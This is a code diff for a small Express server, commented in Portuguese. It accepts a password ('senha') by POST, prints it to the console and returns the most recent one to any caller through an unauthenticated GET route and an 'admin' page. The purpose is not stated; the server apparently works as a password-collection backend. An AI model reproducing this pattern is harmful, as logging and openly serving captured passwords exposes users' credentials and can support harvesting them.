@@ -1,27 +1,39 @@
 const express = require('express');
-const cors = require('cors');
+const path = require('path');
 const app = express();
+const PORT = process.env.PORT || 3000;
 
-let senhaRecebida = "";
+let senhaRecebida = '';
 
-app.use(cors());
 app.use(express.json());
 
+// Serve arquivos estáticos da pasta "public"
+app.use(express.static(path.join(__dirname, 'public')));
+
+// Rota POST para receber a senha
 app.post('/api/senha', (req, res) => {
-  senhaRecebida = req.body.senha;
-  console.log("Senha recebida:", senhaRecebida);
-  res.status(200).send("Senha recebida.");
+  const { senha } = req.body;
+  if (!senha) return res.status(400).json({ error: 'Senha não fornecida' });
+  senhaRecebida = senha;
+  console.log('Senha recebida:', senha);
+  res.status(200).json({ message: 'Senha recebida com sucesso' });
 });
 
-app.get('/admin', (req, res) => {
-  res.send(`Senha mais recente recebida: ${senhaRecebida}`);
+// Rota GET para o painel admin buscar a senha
+app.get('/api/senha', (req, res) => {
+  res.json({ senha: senhaRecebida });
 });
 
+// Serve o index.html por padrão na raiz
 app.get('/', (req, res) => {
-  res.send("Servidor rodando.");
+  res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-const PORT = process.env.PORT || 3000;
+// (Opcional) Serve admin.html diretamente via URL
+app.get('/admin', (req, res) => {
+  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
+});
+
 app.listen(PORT, () => {
   console.log(`Servidor rodando na porta ${PORT}`);
 });
